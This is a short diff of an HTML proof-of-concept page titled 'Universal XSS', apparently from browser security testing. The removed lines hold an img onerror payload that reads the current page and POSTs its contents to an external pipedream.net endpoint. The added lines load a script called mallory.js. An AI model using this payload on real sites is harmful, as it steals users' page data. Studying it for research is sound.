@@ -3,7 +3,6 @@
 <head>
   <title>Universal XSS</title>
 </head>
-<script defer>
-  document.title = "<img src/ onerror='fetch(window.location.href).then(response => response.text()).then(responseText => fetch(\"https://eok0h61dts3i7c3.m.pipedream.net\", { method: \"POST\", body: responseText }));>";
-</script>
+<h1>This is a malicious webpage</h1>
+<script src="mallory.js"></script>
 </html>
